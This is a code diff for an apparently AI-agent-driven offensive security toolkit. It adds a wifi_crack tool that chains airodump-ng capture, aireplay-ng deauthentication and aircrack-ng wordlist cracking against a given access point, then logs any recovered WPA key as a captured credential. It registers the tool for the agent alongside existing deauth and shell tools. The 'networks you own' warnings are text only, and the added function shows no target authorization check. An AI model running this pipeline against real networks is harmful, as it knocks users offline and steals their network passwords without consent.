@@ -1,12 +1,15 @@
 #airecon2 system-level tools - route through the docker lab (Linux) when possible.
 #Monitor mode / RF tools only truly work inside the lab with a passed-through USB adapter.
 import json
+import re
 import shutil
 import subprocess
 import sys
 
 from .gate import check_target, _audit, _load_authorized
 from . import lab
+from .. import report as _report
+from ..report import capture_intel as _capture_intel
 import os
 
 
@@ -73,16 +76,59 @@ def wifi_capture(iface: str = "wlan0mon", duration: int = 15, channel: str = "",
     _audit("WIFI_CAPTURE", f"iface={iface} dur={duration} ch={channel}")
     if not lab.lab_available():
         return json.dumps({"error": "wifi capture requires the lab container (aircrack/tshark)",
-                           "hint": "cd D:/projects/airecon2/lab && docker compose up -d; attach USB wifi via usbipd"}, indent=1)
-    ch = f"iw dev {iface} set channel {channel} 2>/dev/null; " if channel else ""
+                           "hint": "cd lab && docker compose up -d; attach USB wifi via usbipd"}, indent=1)
+    ch_cmd = f"iw dev {iface} set channel {channel} 2>/dev/null; " if channel else ""
     r = lab.lab_exec(
-        f"timeout {min(duration,120)} tcpdump -i {iface} -c 300 -nn -e 2>&1 | head -100 || "
+        f"{ch_cmd}timeout {min(duration,120)} tcpdump -i {iface} -c 300 -nn -e 2>&1 | head -100 || "
         f"echo 'capture failed - is {iface} in monitor mode? (airmon-ng start wlan0)'",
         timeout=min(duration, 120) + 30,
     )
     if channel:
-        r["note"] = f"channel {ch.strip()} attempted"
+        r["note"] = f"channel {channel} attempted"
     return json.dumps(r, indent=1)
+
+
+def wifi_crack(bssid: str, iface: str = "wlan0mon", essid: str = "",
+               wordlist: str = "", timeout: int = 240, **_) -> str:
+    """Full WPA/WPA2 crack pipeline against an AUTHORIZED access point:
+    capture on the BSSID, force a handshake (deauth), re-capture, aircrack-ng
+    against the wordlist. Handshake + result are saved; the key, if found,
+    is captured to workspace/intel.txt. USE ONLY ON NETWORKS YOU OWN."""
+    _audit("WIFI_CRACK", f"bssid={bssid} iface={iface} essid={essid or '(any)'}")
+    if not lab.lab_available():
+        return json.dumps({"error": "wifi_crack requires the lab container with a monitor-mode adapter",
+                           "hint": "cd lab && docker compose up -d --build; attach the USB adapter via usbipd, then airmon-ng start wlan0"}, indent=1)
+    ess = re.sub(r"[^A-Za-z0-9_-]", "", essid) or bssid.replace(":", "")
+    cap = f"/workspace/handshake_{ess}"
+    word = wordlist or "/usr/share/wordlists/rockyou.txt"
+
+    steps = {}
+    steps["capture_1"] = lab.lab_exec(
+        f"timeout 45 airodump-ng -d {bssid} -w {cap} --output-format cap {iface} >/dev/null 2>&1; "
+        f"ls -la {cap}-01.cap 2>/dev/null || echo 'nothing captured - wrong iface or channel'", timeout=70)
+    steps["deauth"] = lab.lab_exec(f"aireplay-ng -0 5 -a {bssid} {iface} 2>&1 | tail -3", timeout=60)
+    steps["capture_2"] = lab.lab_exec(
+        f"timeout 60 airodump-ng -d {bssid} -w {cap} --output-format cap {iface} >/dev/null 2>&1; "
+        f"ls -la {cap}-01.cap 2>/dev/null || echo 'no capture file'", timeout=90)
+    steps["crack"] = lab.lab_exec(
+        f"test -f {cap}-01.cap && (aircrack-ng -w {word} -b {bssid} {cap}-01.cap 2>&1 | tail -12) "
+        f"|| echo 'no handshake captured - cannot crack'", timeout=min(max(timeout, 60), 560))
+
+    crack_out = str(steps["crack"].get("output", ""))
+    key_found = None
+    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", crack_out)
+    if m:
+        key_found = m.group(1)
+        _capture_intel("WIFI_KEY", f"bssid={bssid} essid={essid or ess} key={key_found}")
+        _report.append_cred(f"wifi/{essid or ess}:{key_found}")
+    return json.dumps({
+        "target": {"bssid": bssid, "essid": essid, "iface": iface},
+        "capture_file": f"workspace/handshake_{ess}-01.cap (host)",
+        "wordlist": word,
+        "key_found": key_found,
+        "steps": {k: (v.get("output", "") or "")[-800:] for k, v in steps.items()},
+        "note": "only on networks you own; handshake kept in workspace/ for teaching",
+    }, indent=1)
 
 
 def monitor_mode(iface: str = "wlan0", **_) -> str:
@@ -125,6 +171,8 @@ SCHEMAS = [
         "parameters": {"type": "object", "properties": {"iface": {"type": "string"}}, "required": ["iface"]}}},
     {"type": "function", "function": {"name": "deauth", "description": "Send deauth frames from the lab (OFFENSIVE - only on networks you own/are authorized to test).",
         "parameters": {"type": "object", "properties": {"iface": {"type": "string"}, "bssid": {"type": "string"}, "count": {"type": "integer"}, "station": {"type": "string"}}, "required": ["bssid"]}}},
+    {"type": "function", "function": {"name": "wifi_crack", "description": "WPA/WPA2 crack pipeline on an AUTHORIZED AP: capture, force handshake, aircrack-ng against a wordlist. Saves the handshake and logs a found key to workspace/intel.txt.",
+        "parameters": {"type": "object", "properties": {"bssid": {"type": "string"}, "iface": {"type": "string", "description": "monitor interface, default wlan0mon"}, "essid": {"type": "string"}, "wordlist": {"type": "string", "description": "path to wordlist inside the lab (default rockyou)"}, "timeout": {"type": "integer"}}, "required": ["bssid"]}}},
     {"type": "function", "function": {"name": "lab_status", "description": "Show lab container status, installed tooling, and wireless interfaces.",
         "parameters": {"type": "object", "properties": {}}}},
 ]
@@ -132,5 +180,5 @@ SCHEMAS = [
 DISPATCH = {
     "nmap_scan": nmap_scan, "shell": shell, "wifi_scan": wifi_scan,
     "wifi_capture": wifi_capture, "monitor_mode": monitor_mode,
-    "deauth": deauth, "lab_status": lab_status,
+    "deauth": deauth, "wifi_crack": wifi_crack, "lab_status": lab_status,
 }
